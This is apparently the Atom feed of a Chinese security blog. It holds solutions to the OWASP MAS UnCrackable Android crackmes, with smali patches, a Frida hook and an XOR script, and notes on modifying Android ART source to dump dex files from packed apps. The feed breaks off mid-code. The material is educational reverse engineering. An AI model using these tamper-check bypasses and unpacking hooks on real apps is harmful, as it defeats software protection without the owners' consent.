<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Misaki&#39;s Blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://misakikata.github.io/"/>
  <updated>2022-12-29T02:49:02.105Z</updated>
  <id>https://misakikata.github.io/</id>
  
  <author>
    <name>Misaki</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>WeiXin MiniProgram</title>
    <link href="https://misakikata.github.io/2022/12/WeiXin-MiniProgram/"/>
    <id>https://misakikata.github.io/2022/12/WeiXin-MiniProgram/</id>
    <published>2022-12-29T02:48:43.000Z</published>
    <updated>2022-12-29T02:49:02.105Z</updated>
    
    <content type="html"><![CDATA[<h3 id="MiniProgram"><a href="#MiniProgram" class="headerlink" title="MiniProgram"></a>MiniProgram</h3><p>之前的小程序由于服务和小程序的原因已经下线了，现在重新用WordPress后端部署了一个新小程序，搭建使用了Serverless服务，不得不说这个玩意响应是真的有点慢，加载内容的时候需要等待少许时间。</p><p>小程序图料码：<br><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/img/2022/12/29/10-47-19-8d33d040e42d9f086a13827162cc246a-%E4%B8%8B%E8%BD%BD-17fdcb.png"></p><p>后续会继续维护，也可以留言给我您的意见和希望看到的文章类型，只要我会，都可以写一写，不嫌弃就好。233333</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;MiniProgram&quot;&gt;&lt;a href=&quot;#MiniProgram&quot; class=&quot;headerlink&quot; title=&quot;MiniProgram&quot;&gt;&lt;/a&gt;MiniProgram&lt;/h3&gt;&lt;p&gt;之前的小程序由于服务和小程序的原因已经下线了，现在重新用WordPr
      
    
    </summary>
    
    
      <category term="渗透测试" scheme="https://misakikata.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="Android逆向" scheme="https://misakikata.github.io/tags/Android%E9%80%86%E5%90%91/"/>
    
      <category term="web安全" scheme="https://misakikata.github.io/tags/web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>MAS Crackmes</title>
    <link href="https://misakikata.github.io/2022/12/MAS-Crackmes/"/>
    <id>https://misakikata.github.io/2022/12/MAS-Crackmes/</id>
    <published>2022-12-19T08:25:33.000Z</published>
    <updated>2022-12-19T08:25:33.646Z</updated>
    
    <content type="html"><![CDATA[<h2 id="UnCrackable-Level1"><a href="#UnCrackable-Level1" class="headerlink" title="UnCrackable-Level1"></a>UnCrackable-Level1</h2><p>下载地址: <a href="https://mas.owasp.org/crackmes/">https://mas.owasp.org/crackmes/</a></p><p>国际惯例，JEB打开APK，找到main。看到onCreate里有两个提示，应该是检测了ROOT和调试的环境，可以使用frida来修改返回，或者执行修改APK判断，这里直接修改判断，为了少写代码。</p><p>直接把验证部分删了：</p><pre class="line-numbers language-none"><code class="language-none">.method protected onCreate(Bundle)V          .registers 300000000  invoke-static       c-&gt;a()Z00000006  move-result         v000000008  if-nez              v0, :24:C0000000C  invoke-static       c-&gt;b()Z00000012  move-result         v000000014  if-nez              v0, :24:1800000018  invoke-static       c-&gt;c()Z0000001E  move-result         v000000020  if-eqz              v0, :2E:2400000024  const-string        v0, &quot;Root detected!&quot;00000028  invoke-direct       MainActivity-&gt;a(String)V, p0, v0:2E0000002E  invoke-virtual      MainActivity-&gt;getApplicationContext()Context, p000000034  move-result-object  v000000036  invoke-static       b-&gt;a(Context)Z, v00000003C  move-result         v00000003E  if-eqz              v0, :4C:4200000042  const-string        v0, &quot;App is debuggable!&quot;00000046  invoke-direct       MainActivity-&gt;a(String)V, p0, v0:4C0000004C  invoke-super        Activity-&gt;onCreate(Bundle)V, p0, p100000052  const&#x2F;high16        p1, 0x7F030000        # layout:activity_main00000056  invoke-virtual      MainActivity-&gt;setContentView(I)V, p0, p10000005C  return-void.end method​<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>修改为</p><pre class="line-numbers language-none"><code class="language-none">.method protected onCreate(Bundle)V          .registers 30000004C  invoke-super        Activity-&gt;onCreate(Bundle)V, p0, p100000052  const&#x2F;high16        p1, 0x7F030000        # layout:activity_main00000056  invoke-virtual      MainActivity-&gt;setContentView(I)V, p0, p10000005C  return-void.end method​<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>编译，签名安装即可。</p><p>整个验证的逻辑在verify内：</p><pre class="line-numbers language-none"><code class="language-none">public void verify(View arg4) &#123;        String v4_1;        String v4 &#x3D; ((EditText)this.findViewById(0x7F020001)).getText().toString();  &#x2F;&#x2F; id:edit_text        AlertDialog v0 &#x3D; new AlertDialog.Builder(this).create();        if(a.a(v4)) &#123;            v0.setTitle(&quot;Success!&quot;);            v4_1 &#x3D; &quot;This is the correct secret.&quot;;        &#125;        else &#123;            v0.setTitle(&quot;Nope...&quot;);            v4_1 &#x3D; &quot;That\&#39;s not it. Try again.&quot;;        &#125;​        v0.setMessage(v4_1);        v0.setButton(-3, &quot;OK&quot;, new DialogInterface.OnClickListener() &#123;            @Override  &#x2F;&#x2F; android.content.DialogInterface$OnClickListener            public void onClick(DialogInterface arg1, int arg2) &#123;                arg1.dismiss();            &#125;        &#125;);        v0.show();    &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>其中a函数，因此加密密钥和加密内容就已知。</p><pre class="line-numbers language-none"><code class="language-none">public static boolean a(String arg5) &#123;        byte[] v1 &#x3D; Base64.decode(&quot;5UJiFctbmgbDoLXmpL12mkno8HT4Lv8dlat8FxR2GOc&#x3D;&quot;, 0);        byte[] v2 &#x3D; new byte[0];        try &#123;            return arg5.equals(new String(sg.vantagepoint.a.a.a(new byte[]&#123;(byte)0x8D, 18, 0x76, (byte)0x84, -53, -61, 0x7C, 23, 97, 109, (byte)0x80, 108, -11, 4, 0x73, -52&#125;, v1)));        &#125;        catch(Exception v0) &#123;            Log.d(&quot;CodeCheck&quot;, &quot;AES error:&quot; + v0.getMessage());            return arg5.equals(new String(v2));        &#125;    &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然而这里Cipher.init中的是2，也就是解密，我们需要知道解密后的内容。hook</p><pre class="line-numbers language-none"><code class="language-none">sg.vantagepoint.a.a.a<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>随便输入一段内容，获取到输出为</p><pre class="line-numbers language-none"><code class="language-none">ZenTracer:::&#123;&quot;cmd&quot;:&quot;exit&quot;,&quot;data&quot;:[&quot;1&quot;,&quot;73,32,119,97,110,116,32,116,111,32,98,101,108,105,101,118,101&quot;]&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>转换为字符串就是：</p><pre class="line-numbers language-none"><code class="language-none">I want to believe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>当然如果你直接分析加密代码，然后代码还原出来那就是：</p><pre class="line-numbers language-none"><code class="language-none">import java.util.Base64;import javax.crypto.BadPaddingException;import javax.crypto.Cipher;import javax.crypto.IllegalBlockSizeException;import javax.crypto.NoSuchPaddingException;import javax.crypto.spec.SecretKeySpec;import java.security.InvalidKeyException;import java.security.NoSuchAlgorithmException;​​public class owasp &#123;    public static void main(String[] args) throws Exception &#123;        System.out.println(a());    &#125;​    public static String a() throws NoSuchPaddingException, NoSuchAlgorithmException, InvalidKeyException, IllegalBlockSizeException, BadPaddingException &#123;        byte[] arg2 &#x3D; new byte[]&#123;(byte)0x8D, 18, 0x76, (byte)0x84, -53, -61, 0x7C, 23, 97, 109, (byte)0x80, 108, -11, 4, 0x73, -52&#125;;        byte[] arg3 &#x3D; Base64.getDecoder().decode(&quot;5UJiFctbmgbDoLXmpL12mkno8HT4Lv8dlat8FxR2GOc&#x3D;&quot;);        SecretKeySpec v0 &#x3D; new SecretKeySpec(arg2, &quot;AES&quot;);        Cipher v2 &#x3D; Cipher.getInstance(&quot;AES&#x2F;ECB&#x2F;PKCS5Padding&quot;);        v2.init(Cipher.DECRYPT_MODE, v0);        return new String(v2.doFinal(arg3));​    &#125;​&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="UnCrackable-Level2"><a href="#UnCrackable-Level2" class="headerlink" title="UnCrackable-Level2"></a>UnCrackable-Level2</h2><p>看到这个大概就知道这货想干啥了</p><pre class="line-numbers language-none"><code class="language-none">static &#123;        System.loadLibrary(&quot;foo&quot;);    &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>先按照流程来看一下，跟上面差不多，几个检测，不过这里先加载so的init函数。</p><p>然后加密的方法被写到了so的</p><pre class="line-numbers language-none"><code class="language-none">public class CodeCheck &#123;    public boolean a(String arg1) &#123;        return this.bar(arg1.getBytes());    &#125;    private native boolean bar(byte[] arg1) &#123;    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后去so中找一下这两个函数，其中init中关键函数是sub_93C</p><pre class="line-numbers language-none"><code class="language-none">.text:00000BA4                 PUSH            &#123;R7,LR&#125;.text:00000BA6                 MOV             R7, SP.text:00000BA8                 BL              sub_93C.text:00000BAC                 LDR             R0, &#x3D;(byte_400C - 0xBB4).text:00000BAE                 MOVS            R1, #1.text:00000BB0                 ADD             R0, PC  ; byte_400C.text:00000BB2                 STRB            R1, [R0].text:00000BB4                 POP             &#123;R7,PC&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>sub_93C的伪代码是，是一个验证app调试行为的检测。</p><pre class="line-numbers language-none"><code class="language-none">int sub_93C()&#123;  __pid_t v0; &#x2F;&#x2F; r4  pthread_t newthread; &#x2F;&#x2F; [sp+4h] [bp-1Ch] BYREF  int stat_loc[6]; &#x2F;&#x2F; [sp+8h] [bp-18h] BYREF  dword_4008 &#x3D; fork();  if ( dword_4008 )  &#123;    pthread_create(&amp;newthread, 0, sub_914, 0);  &#125;  else  &#123;    v0 &#x3D; getppid();    if ( !ptrace(PTRACE_ATTACH, v0, 0, 0) )    &#123;      waitpid(v0, stat_loc, 0);      while ( 1 )      &#123;        ptrace(PTRACE_CONT, v0, 0, 0);        if ( !waitpid(v0, stat_loc, 0) )          break;        if ( (stat_loc[0] &amp; 0x7F) !&#x3D; 127 )          exit(0);      &#125;    &#125;  &#125;  return _stack_chk_guard - stat_loc[1];&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>另一个bar函数</p><pre class="line-numbers language-none"><code class="language-none">bool __fastcall Java_sg_vantagepoint_uncrackable2_CodeCheck_bar(_JNIEnv *a1, _JavaVM *a2, int a3)&#123;  const char *v5; &#x2F;&#x2F; r8  _BOOL4 result; &#x2F;&#x2F; r0  char s2[24]; &#x2F;&#x2F; [sp+4h] [bp-2Ch] BYREF  result &#x3D; 0;  if ( byte_400C &#x3D;&#x3D; 1 )  &#123;    strcpy(s2, &quot;Thanks for all the fish&quot;);    v5 &#x3D; a1-&gt;functions-&gt;GetByteArrayElements(a1, a3, 0);    if ( a1-&gt;functions-&gt;GetArrayLength(a1, a3) &#x3D;&#x3D; 23 &amp;&amp; !strncmp(v5, s2, 0x17u) )      result &#x3D; 1;  &#125;  return result;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>因为我们需要把result返回1，也就是让后续的判断为真，所以需要查看内部流程。</p><p>有两个要求，其中是字节数组长度为23，跟上面的字符比较必须相等，这里有个小问题，byte_400C是init里来加载赋值的，也就是修改代码的时候不能去掉这个函数的渲染。</p><pre class="line-numbers language-none"><code class="language-none">.method protected onCreate(Landroid&#x2F;os&#x2F;Bundle;)V    .locals 4        invoke-direct &#123;p0&#125;, Lsg&#x2F;vantagepoint&#x2F;uncrackable2&#x2F;MainActivity;-&gt;init()V        new-instance v0, Lsg&#x2F;vantagepoint&#x2F;uncrackable2&#x2F;CodeCheck;    invoke-direct &#123;v0&#125;, Lsg&#x2F;vantagepoint&#x2F;uncrackable2&#x2F;CodeCheck;-&gt;&lt;init&gt;()V    iput-object v0, p0, Lsg&#x2F;vantagepoint&#x2F;uncrackable2&#x2F;MainActivity;-&gt;m:Lsg&#x2F;vantagepoint&#x2F;uncrackable2&#x2F;CodeCheck;    invoke-super &#123;p0, p1&#125;, Landroid&#x2F;support&#x2F;v7&#x2F;app&#x2F;c;-&gt;onCreate(Landroid&#x2F;os&#x2F;Bundle;)V    const p1, 0x7f09001b    invoke-virtual &#123;p0, p1&#125;, Lsg&#x2F;vantagepoint&#x2F;uncrackable2&#x2F;MainActivity;-&gt;setContentView(I)V    return-void.end method<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>编译安装，输入上面的字符串即可</p><pre class="line-numbers language-none"><code class="language-none">Thanks for all the fish<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="UnCrackable-Level3"><a href="#UnCrackable-Level3" class="headerlink" title="UnCrackable-Level3"></a>UnCrackable-Level3</h2><p>形似如上，但是多了一个文件的校验verifyLibs，这个返回不正常的时候会给tampered一个非0的值，导致后续的判断中失败。</p><p>但是这个app有一个麻烦的地方在于，他的检测跟上面的不一样，首先是Java层，删除MainActivity$2，还有MainActivity中的调用部分即可，但是安装后还是会闪退，这个现象明显不是Java层代码控制的。</p><p>从函数中可以看到一个goodbye函数，在sub_23C4中发现有调用，但是没有明显调用存在这个函数的地方，也没有明写在JNI_Onload中，大概在init_array中，于是发现有函数的调用。sub_2468中调用了sub_23C4</p><pre class="line-numbers language-none"><code class="language-none">.init_array:00005DF0 ; Segment type: Pure data.init_array:00005DF0                 AREA .init_array, DATA.init_array:00005DF0                 ; ORG 0x5DF0.init_array:00005DF0                 DCD sub_2468+1.init_array:00005DF0 ; .init_array   ends.init_array:00005DF0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>于是我们需要修改sub_23C4这个函数的判断逻辑。</p><p>由于原逻辑是如下判断：</p><pre class="line-numbers language-none"><code class="language-none">void __noreturn sub_23C4()&#123;  FILE *v0; &#x2F;&#x2F; r4  char v1[536]; &#x2F;&#x2F; [sp+0h] [bp-218h] BYREF  while ( 1 )  &#123;    v0 &#x3D; fopen(&quot;&#x2F;proc&#x2F;self&#x2F;maps&quot;, &quot;r&quot;);    if ( !v0 )      break;    while ( fgets(v1, 512, v0) )    &#123;      if ( strstr(v1, &quot;frida&quot;) || strstr(v1, &quot;xposed&quot;) )      &#123;        _android_log_print(2, &quot;UnCrackable3&quot;, &quot;Tampering detected! Terminating...&quot;);LABEL_10:        goodbye();      &#125;    &#125;    fclose(v0);    usleep(0x1F4u);  &#125;  _android_log_print(2, &quot;UnCrackable3&quot;, &quot;Error opening &#x2F;proc&#x2F;self&#x2F;maps! Terminating...&quot;);  goto LABEL_10;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这时候可以在日志过滤查看，验证一下想法，可以发现确实是显示了<code>Tampering detected! Terminating...</code>。</p><p>先修改了，但是这样发现还是会报错，于是直接在最后退出的地方，修改掉exit()。</p><pre class="line-numbers language-none"><code class="language-none">.text:000023EA loc_23EA                                ; CODE XREF: sub_23C4+48↓j.text:000023EA                                         ; sub_23C4+66↓j.text:000023EA                 MOV             R0, R6  ; s.text:000023EC                 MOV.W           R1, #0x200 ; n.text:000023F0                 MOV             R2, R4  ; stream.text:000023F2                 BLX             fgets.text:000023F6                 CBZ             R0, loc_2410.text:000023F8                 MOV             R0, R6  ; char *.text:000023FA                 MOV             R1, R10 ; char *.text:000023FC                 BLX             strstr.text:00002400                 CBZ             R0, loc_2436 ; Keypatch modified this from:.text:00002400                                         ;   CBNZ R0, loc_2436.text:00002402                 MOV             R0, R6  ; char *.text:00002404                 MOV             R1, R5  ; char *.text:00002406                 BLX             strstr.text:0000240A                 CMP             R0, #0.text:0000240C                 BNE             loc_23EA ; Keypatch modified this from:.text:0000240C                                         ;   BEQ loc_23EA.text:0000240E                 B               loc_2436<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>把最后的BLX指令给nop掉，修改Hex为00000000</p><pre class="line-numbers language-none"><code class="language-none">.text:0000238C _Z7goodbyev                             ; CODE XREF: goodbye(void)+8↑j.text:0000238C                                         ; DATA XREF: LOAD:000002A0↑o ....text:0000238C ; __unwind &#123;.text:0000238C                 PUSH            &#123;R7,LR&#125;.text:0000238E                 MOV             R7, SP.text:00002390                 MOVS            R0, #6  ; sig.text:00002392                 BLX             raise.text:00002396                 MOVS            R0, #0  ; status.text:00002398                 BLX             _exit.text:00002398 ; &#125; &#x2F;&#x2F; starts at 238C<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>重新打包安装，即可正常打开app。然后再来看后续的逻辑。</p><p>主逻辑还是在so中，找到init函数</p><pre class="line-numbers language-none"><code class="language-none">&#123;  char *v5; &#x2F;&#x2F; r6  sub_24BC(a1, a2);    &#x2F;&#x2F;需要调试可以nop掉  v5 &#x3D; a1-&gt;functions-&gt;GetByteArrayElements(a1, a3, 0);  strncpy(byte_6034, v5, 0x18u);  a1-&gt;functions-&gt;ReleaseByteArrayElements(a1, a3, v5, 2);  return ++dword_6030;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>还是获取一个输入字节的作用，然后主要是bar</p><pre class="line-numbers language-none"><code class="language-none">&#123;  jbyte *v5; &#x2F;&#x2F; r6  unsigned int i; &#x2F;&#x2F; r0  int result; &#x2F;&#x2F; r0  _BYTE v8[28]; &#x2F;&#x2F; [sp+0h] [bp-38h] BYREF  memset(v8, 0, 0x19u);  if ( dword_6030 !&#x3D; 2 )    goto LABEL_9;  sub_EBC(v8);  v5 &#x3D; a1-&gt;functions-&gt;GetByteArrayElements(a1, a3, 0);  if ( a1-&gt;functions-&gt;GetArrayLength(a1, a3) !&#x3D; 24 )    goto LABEL_9;  for ( i &#x3D; 0; i &lt;&#x3D; 0x17; ++i )  &#123;    if ( v5[i] !&#x3D; (v8[i] ^ *(&amp;dword_6030 + i + 4)) )   &#x2F;&#x2F;dword_6030 &#x3D; 2      goto LABEL_9;  &#125;  if ( i &#x3D;&#x3D; 24 )    result &#x3D; 1;  elseLABEL_9:    result &#x3D; 0;  return result;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>基本可以知道如果需要得到这个v5就是我们输入的值也就是需要得到的值，那我们需要知道v8这个值，但是sub_EBC不知道在干啥，有两千多行，但是你把参数修改为一个值的时候就会发现，其实只有最后几行进行了操作，开辟了一个24字节的空间。</p><pre class="line-numbers language-none"><code class="language-none">if ( result )  &#123;    memset(key, 0, 0x19u);    *key &#x3D; 319883293;   &#x2F;&#x2F;0x1311081d    key[1] &#x3D; 357111567;  &#x2F;&#x2F;0x1549170f    key[2] &#x3D; 419627021;   &#x2F;&#x2F;0x1903000d    key[3] &#x3D; 353574234;  &#x2F;&#x2F;0x15131d5a    *(key + 8) &#x3D; 3592;    result &#x3D; (&amp;loc_1412 + 1);    *(key + 18) &#x3D; 135725146;    *(key + 11) &#x3D; 5139;  &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>arm默认是小端格式，所以这个key就是<code>1d0811130f1749150d0003195a1d1315080e5a0017081314</code>，然后最奇怪的地方来了，从伪代码上看这里是跟一个常量进行了异或，但是这个明显不正常，异或的结果也不对，后来查了一下发现一开始传入的xorkey被忽略掉了，虽然这里没细看出来调用关系，但是确实是调用了，使用Ghidra就可以看到。</p><p>使用脚本进行异或，得到结果<code>making owasp great again</code>。</p><pre class="line-numbers language-none"><code class="language-none">secret &#x3D; &quot;&quot;other_key &#x3D; bytes.fromhex(&quot;1d0811130f1749150d0003195a1d1315080e5a0017081314&quot;)pizza &#x3D; bytes(&quot;pizzapizzapizzapizzapizz&quot;,&#39;utf-8&#39;)for (a, b) in zip(pizza, other_key):    secret &#x3D; secret + chr(a ^ b)print(secret)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="UnCrackable-Level4"><a href="#UnCrackable-Level4" class="headerlink" title="UnCrackable-Level4"></a>UnCrackable-Level4</h2><p>这个有点复杂，别问，问就是不会。&#x2F;(ㄒoㄒ)&#x2F;~~</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;UnCrackable-Level1&quot;&gt;&lt;a href=&quot;#UnCrackable-Level1&quot; class=&quot;headerlink&quot; title=&quot;UnCrackable-Level1&quot;&gt;&lt;/a&gt;UnCrackable-Level1&lt;/h2&gt;&lt;p&gt;下载地址: 
      
    
    </summary>
    
    
      <category term="Android逆向" scheme="https://misakikata.github.io/tags/Android%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>ART脱壳源码修改点</title>
    <link href="https://misakikata.github.io/2022/10/ART%E8%84%B1%E5%A3%B3%E6%BA%90%E7%A0%81%E4%BF%AE%E6%94%B9%E7%82%B9/"/>
    <id>https://misakikata.github.io/2022/10/ART脱壳源码修改点/</id>
    <published>2022-10-21T06:46:30.000Z</published>
    <updated>2022-10-21T06:46:30.953Z</updated>
    
    <content type="html"><![CDATA[<p>在将 dex 文件编译为 oat 文件的过程中 , 只要出现了 DexFile 对象 , 就可以将该对象对应的 dex 文件导出</p><h2 id="已知的脱壳点"><a href="#已知的脱壳点" class="headerlink" title="已知的脱壳点"></a>已知的脱壳点</h2><p><strong>&#x2F;art&#x2F;runtime&#x2F;dex_file.cc#OpenMemory</strong><br>OpenMemory算是常见的脱壳点，在# frida-unpack中也是使用此脱壳点来导出dex对象。</p><pre class="line-numbers language-none"><code class="language-none">std::unique_ptr&lt;const DexFile&gt; DexFile::OpenMemory(const uint8_t* base, size_t size,  const std::string&amp; location,   uint32_t location_checksum,  MemMap* mem_map, const OatDexFile* oat_dex_file, std::string* error_msg) &#123; CHECK_ALIGNED(base, 4);  &#x2F;&#x2F; various dex file structures must be word aligned  std::unique_ptr&lt;DexFile&gt; dex_file(     new DexFile(base, size, location, location_checksum, mem_map, oat_dex_file)); if (!dex_file-&gt;Init(error_msg)) &#123;    dex_file.reset();  &#125;  return std::unique_ptr&lt;const DexFile&gt;(dex_file.release());&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>添加导出代码</p><pre class="line-numbers language-none"><code class="language-none">#include &lt;sys&#x2F;types.h&gt;  &#x2F;&#x2F;添加额外的库#include &lt;sys&#x2F;stat.h&gt;#include &lt;fcntl.h&gt;int dexCount &#x3D; 0;  &#x2F;&#x2F;注意位置  char output[100]&#x3D;&#123;0&#125;;  int pid &#x3D; getpid();  sprintf(output, &quot;&#x2F;sdcard&#x2F;%d_%d_output.dex&quot;, pid, dexCount);  dexCount++;  int fd &#x3D; open(output,O_CREAT|O_RDWR,666);  if (fd &gt; 0)  &#123;  write(fd, base, size);  close(fd);  &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>DexFile::DexFile()</strong></p><p>在17年的DEF CON 25 黑客大会中，Avi Bashan 和 SlavaMakkaveev 提出的通过修改DexFile的构造函数DexFile::DexFile()，以及OpenAndReadMagic()函数来实现对加壳应用的内存中的dex的dump来脱壳技术</p><pre class="line-numbers language-none"><code class="language-none">DexFile::DexFile(const uint8_t* base, size_t size,                 const std::string&amp; location,                 uint32_t location_checksum,                 MemMap* mem_map,                 const OatDexFile* oat_dex_file)    : begin_(base),      size_(size),      location_(location),      location_checksum_(location_checksum),      mem_map_(mem_map),      header_(reinterpret_cast&lt;const Header*&gt;(base)),      string_ids_(reinterpret_cast&lt;const StringId*&gt;(base + header_-&gt;string_ids_off_)),      type_ids_(reinterpret_cast&lt;const TypeId*&gt;(base + header_-&gt;type_ids_off_)),      field_ids_(reinterpret_cast&lt;const FieldId*&gt;(base + header_-&gt;field_ids_off_)),      method_ids_(reinterpret_cast&lt;const MethodId*&gt;(base + header_-&gt;method_ids_off_)),      proto_ids_(reinterpret_cast&lt;const ProtoId*&gt;(base + header_-&gt;proto_ids_off_)),      class_defs_(reinterpret_cast&lt;const ClassDef*&gt;(base + header_-&gt;class_defs_off_)),      find_class_def_misses_(0),      class_def_index_(nullptr),      oat_dex_file_(oat_dex_file) &#123;  CHECK(begin_ !&#x3D; nullptr) &lt;&lt; GetLocation();  CHECK_GT(size_, 0U) &lt;&lt; GetLocation();&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>添加代码</p><pre class="line-numbers language-none"><code class="language-none">+   &#x2F;&#x2F;------------------------------------------------------------------+   &#x2F;&#x2F; DEX file unpacking+   &#x2F;&#x2F;------------------------------------------------------------------++   &#x2F;&#x2F; let&#39;s limit processing file list+    LOG(WARNING) &lt;&lt; &quot;Dex File: Filename: &quot;&lt;&lt; location;if (location.find(&quot;&#x2F;data&#x2F;data&#x2F;&quot;) !&#x3D; std::string::npos) &#123;    LOG(WARNING) &lt;&lt; &quot;Dex File: OAT file unpacking launched&quot;;    std::ofstream dst(location + &quot;__unpacked_oat&quot;, std::ios::binary);    dst.write(reinterpret_cast&lt;const char*&gt;(base), size);    dst.close();&#125; else &#123;    LOG(WARNING) &lt;&lt; &quot;Dex File: OAT file unpacking not launched&quot;;&#125;          +   &#x2F;&#x2F;------------------------------------------------------------------<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>OpenFile</strong><br>这个函数跟OpenMemory类似，同样是调用了OpenMemory的返回，也可以在这里直接导出dexfile.</p><pre class="line-numbers language-none"><code class="language-none">std::unique_ptr&lt;const DexFile&gt; dex_file(OpenMemory(location, dex_header-&gt;checksum_, map.release(), error_msg));  if (dex_file.get() &#x3D;&#x3D; nullptr) &#123;    *error_msg &#x3D; StringPrintf(&quot;Failed to open dex file &#39;%s&#39; from memory: %s&quot;, location, error_msg-&gt;c_str());    return nullptr;  &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>Execute</strong><br>这个函数是寒冰大佬公布的，dex2oat对类的初始化函数并没有进行编译，进入到interpreter.cc文件中的Execute函数，进而进入ART下的解释器解释执行。</p><pre class="line-numbers language-none"><code class="language-none">#include &lt;fcntl.h&gt; static inline JValue Execute(Thread* self, const DexFile::CodeItem* code_item,                            ShadowFrame&amp; shadow_frame, JValue result_register) &#123; char *dexfilepath&#x3D;(char*)malloc(sizeof(char)*1000);       if(dexfilepath!&#x3D;nullptr)    &#123;    ArtMethod* artmethod&#x3D;shadow_frame.GetMethod();    const DexFile* dex_file &#x3D; artmethod-&gt;GetDexFile();    const uint8_t* begin_&#x3D;dex_file-&gt;Begin();  &#x2F;&#x2F; Start of data.    size_t size_&#x3D;dex_file-&gt;Size();  &#x2F;&#x2F; Length of data.    int size_int_&#x3D;(int)size_;    int fcmdline &#x3D;-1;    char szCmdline[64]&#x3D; &#123;0&#125;;    char szProcName[256] &#x3D; &#123;0&#125;;    int procid &#x3D; getpid();    sprintf(szCmdline,&quot;&#x2F;proc&#x2F;%d&#x2F;cmdline&quot;, procid);    fcmdline &#x3D; open(szCmdline, O_RDONLY,0644);    if(fcmdline &gt;0)    &#123;        